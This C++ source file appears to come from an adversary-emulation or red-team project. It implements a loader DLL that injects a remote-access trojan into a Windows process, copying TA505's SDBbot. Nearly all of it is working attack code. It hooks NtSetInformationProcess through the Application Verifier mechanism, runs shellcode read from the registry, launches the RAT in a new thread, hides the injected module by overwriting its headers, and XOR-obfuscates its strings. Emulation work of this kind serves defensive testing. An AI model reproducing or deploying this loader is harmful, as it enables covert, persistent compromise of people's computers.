#include "loader.hpp"
#include "verifier.hpp"

wchar_t pwd[MAX_PATH]{};
wchar_t* log_path = nullptr;
unsigned char key[16]{ 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P' }; // change for prod or get from cmake

/*
 * is_only_instance:
 *      About:
 *          Performs a mutex check on \??\WinLogonLoaderMutex to see if this instance of the 
 *          loader DLL is the only one currently running on the system. This is done in case
 *          the target IFEO process has multiple instances.
 *          Dynamically resolves the following API calls due to verifier run-time restrictions:
 *              - NtCreateMutant
 *              - RtlInitUnicodeString
 *      Result:
 *          0 if this instance is the only one, otherwise non-zero value if another instance is already running
 *          or if the mutex check failed.
 *      MITRE ATT&CK Techniques:
 *          T1106: Native API
 */
int is_only_instance() {
    HMODULE ntdll = GetModuleHandleW(XOR_WIDE_LIT(L"NTDLL"));
    if (!ntdll) {
        return 1;
    }

    auto create_mutant = reinterpret_cast<decltype(&NtCreateMutant)>(GetProcAddress(
        ntdll,
        XOR_LIT("NtCreateMutant")
    ));
    if (!create_mutant) {
        return 1;
    }

    auto init_unicode_string = reinterpret_cast<decltype(&RtlInitUnicodeString)>(GetProcAddress(
        ntdll,
        XOR_LIT("RtlInitUnicodeString")
    ));
    if (!init_unicode_string) {
        return 1;
    }

    NTSTATUS status;
    UNICODE_STRING mutant_name;
    OBJECT_ATTRIBUTES attrs;
    HANDLE handle;
    PCWSTR mutant_name_nt = XOR_WIDE_LIT(L"\\??\\WinLogonLoaderMutex");

    init_unicode_string(&mutant_name, mutant_name_nt);

    InitializeObjectAttributes(&attrs, &mutant_name, 0, nullptr, nullptr);
    
    if (NT_ERROR(status = create_mutant(&handle, MUTANT_ALL_ACCESS, &attrs, true))) {
        return 1;
    }

    else if (status == STATUS_OBJECT_NAME_COLLISION || status == STATUS_OBJECT_NAME_EXISTS) {
        return 2;
    }

    return 0;
}

static RTL_VERIFIER_THUNK_DESCRIPTOR thunks[2];
static RTL_VERIFIER_DLL_DESCRIPTOR dlls[2];
static RTL_VERIFIER_PROVIDER_DESCRIPTOR g_provider;

// Hopefully the loader lock means we don't need to sync
bool g_headers_restored = false;

void NTAPI load_callback(wchar_t* name, void*, size_t, void*) {
    if (error::SUCCESS != g_shellcode_result.err || g_headers_restored) {
        return;
    }
  
    g_headers_restored = true;
  
    // Overwrite RAT headers with original host DLL's
    std::copy_n(
        g_shellcode_result.og_headers,
        g_shellcode_result.og_headers_size,
        g_shellcode_result.module_base
    );
  
    // Set headers to readonly
    unsigned long old;
    VirtualProtect(
        g_shellcode_result.module_base,
        g_shellcode_result.og_headers_size,
        PAGE_READONLY,
        &old
    );

    std::fill_n(
        reinterpret_cast<unsigned char*>(g_shellcode_result.og_headers),
        g_shellcode_result.og_headers_size,
        0
    );

    VirtualFree(g_shellcode_result.og_headers, 0, MEM_RELEASE);
}

// May need a sync but hopefully the loader lock covers this
bool g_thread_created = false;

// Hook the NtSetInformationProcess function to execute the RAT payload
NTSTATUS NtSetInformationProcess_hook(
    HANDLE           param1,
    PROCESSINFOCLASS param2,
    void*            param3,	
    unsigned long    param4
) {
    // If the shellcode was successfully executed and this is our first time running the RAT payload export,
    // create a thread to execute the RAT
    if (error::SUCCESS == g_shellcode_result.err && !g_thread_created) {
        CreateThread(
            nullptr,
            0,
            reinterpret_cast<PTHREAD_START_ROUTINE>(g_shellcode_result.func),
            nullptr,
            0,
            nullptr
        );
    }
    g_thread_created = true;

    NTSTATUS status =  (reinterpret_cast<decltype(&NtSetInformationProcess)>(thunks[0].ThunkOldAddress))(
        param1,
        param2,
        param3,
        param4
    );

    thunks[0].ThunkNewAddress = thunks[0].ThunkOldAddress;
    return status;
}

extern "C" __declspec(dllexport)
int load() {
    auto status = loader_main();
    if (!status.has_value()) {
        common::log_error(XOR_WIDE_LIT(L"Encountered error in loader_main"));
        return 4;
    }
    return 0;
}

wchar_t target_dll[10] = L"ntdll.dll";
char hook_target_name[24] = "NtSetInformationProcess";

/*
 * DllMain:
 *      About:
 *          Performs main loader DLL logic to inject the RAT DLL into the target process:
 *              - Uses verifier DLL functionality to hook the 
 *                NtSetInformationProcess function in the target process
 *              - Reads the shellcode blob that the installer positioned in the registry
 *              - Executes the shellcode to get the RAT DLL payload export
 *              - The function hook will execute the RAT DLL
 *      MITRE ATT&CK Techniques:
 *          T1620: Reflective Code Loading
 *          T1055.001: Process Injection: Dynamic-link Library Injection
 *      CTI:
 *          https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader
 * 			https://securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/
 */
extern "C"
bool WINAPI DllMain(
    HINSTANCE dll,
    DWORD reason,
    PRTL_VERIFIER_PROVIDER_DESCRIPTOR* verifier
) {
    switch (reason)
    {
    case DLL_PROCESS_VERIFIER:
        // Mutex
        int ret = is_only_instance();
        if (ret != 0) {
            // We can't have the verifier fail ever. So this needs to include
            // an empty verifier configuration.
            *verifier = &vpd;
            return true;
        }

        // Verifier
        thunks[0].ThunkName = hook_target_name;
        thunks[0].ThunkOldAddress = nullptr;
        thunks[0].ThunkNewAddress = &NtSetInformationProcess_hook;

        dlls[0].DllName = target_dll;
        dlls[0].DllFlags = 0;
        dlls[0].DllAddress = nullptr;
        dlls[0].DllThunks = thunks;

        RtlSecureZeroMemory(&g_provider, sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR));
        g_provider.Length = sizeof(RTL_VERIFIER_PROVIDER_DESCRIPTOR);
        g_provider.ProviderDlls = dlls;
        g_provider.ProviderDllLoadCallback = load_callback;

        *verifier = &g_provider;

        // Logs
        GetCurrentDirectoryW(MAX_PATH, pwd);
        log_path = wcscat(pwd, XOR_WIDE_LIT(L"\\loader_log.txt"));
        if (common::initialize_logger(log_path, key, 16) != 0) {
            return false;
        }
        common::log_info(XOR_WIDE_LIT(L"Initialization complete."));
        load();
    }
    return true;
}
